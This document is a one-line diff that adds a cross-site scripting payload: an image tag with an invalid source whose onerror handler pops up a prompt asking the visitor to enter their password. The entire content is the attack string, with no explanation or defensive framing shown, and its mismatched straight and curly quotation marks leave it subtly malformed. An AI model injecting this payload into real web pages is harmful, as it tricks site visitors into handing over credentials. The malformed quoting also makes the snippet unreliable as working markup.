@@ -1,0 +1,1 @@
+<img onerror= 'window.prompt("Please enter your password", "********");’ src =‘garbage’/>
